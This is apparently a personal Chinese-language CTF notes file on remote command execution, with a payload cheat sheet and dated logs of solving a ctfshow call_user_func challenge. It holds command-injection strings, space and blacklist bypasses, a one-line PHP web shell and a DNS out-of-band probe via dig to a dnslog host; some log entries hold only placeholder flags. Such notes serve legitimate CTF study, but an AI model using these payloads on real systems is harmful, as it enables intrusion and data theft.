# RCE远程命令执行解题经验

## 检测方法

1. **命令注入**:
   - 参数注入: `;id`, `|whoami`, `` `id` ``
   -  DNS注入: `$(dig xxx.dnslog.cn)`

2. **代码执行**:
   - PHP: `<?php system($_GET['cmd']);?>`
   - Python: `__import__('os').system('id')`

## 常用Payload

### 命令拼接
```
; cat /flag
| cat /flag
`cat /flag`
$(cat /flag)
```

### 绕过空格过滤
```
cat${IFS}/flag
cat$IFS$9/flag
{cat,/flag}
```

### 绕过黑名单
```
/???/c?t /flag  # /bin/cat /flag
$(printf '\x2f\x66\x6c\x61\x67')  # hex编码
```

## 常见漏洞点

- 文件上传功能
- 系统命令执行
- 反序列化
- 代码执行函数 (eval, assert)

## 获取Flag

```bash
# 常见flag位置
/flag
/flag.txt
/var/www/html/flag.txt
/secret/flag

# 读取命令
cat /flag
tac /flag
head /flag
```
## 2026-03-28 | https:
### 靶机环境
- 命令执行漏洞存在

### 成功方法
- **curl_exec**

### 已尝试方法（失败）

### Flag
`FLAG{test_rce}`

---

## 2026-03-28 | https:
### 靶机环境
- call_user_func($_GET[f]) RCE
- phpinfo 泄露自定义函数 ctfshow_1024
- disable_functions=no value

### 成功方法
- **ctfshow_1024**

### 已尝试方法（失败）
- call_user_func

### Flag
`FLAG{welcome_2_ctfshow_1024_cup}`

---

## 2026-03-28 | http:
### 靶机环境
- (无详细记录)

### 成功方法
- **ctfshow_1024**

### 已尝试方法（失败）

### Flag
`FLAG{test}`

---

## 2026-03-28 | https://84c8499c-c760-47bd-bf43-dc83098ff1f1.challenge.ctf.show/

### 靶机环境
- PHP `call_user_func($_GET['f'])` RCE
- `phpinfo()` 泄露自定义函数 `ctfshow_1024`

### 成功方法
- `?f=ctfshow_1024` 直接调用泄露的自定义函数获取 flag

### 关键发现
- `call_user_func($_GET['f'])` 只接受一个参数 `f`，额外参数不会被使用
- phpinfo 中可能包含 `FLAG` 环境变量（值为 `not_flag`）或自定义函数
- 自定义函数 `ctfshow_xxx` 可能直接返回 flag

### 已尝试方法（失败）
- `?f=system&cmd=id` - cmd 参数被忽略
- `?f=exec&cmd=id` - 命令无回显
- `?f=file_get_contents&fn=/flag` - 文件读取但无内容

### Flag
`FLAG{welcome_2_ctfshow_1024_cup}`

---

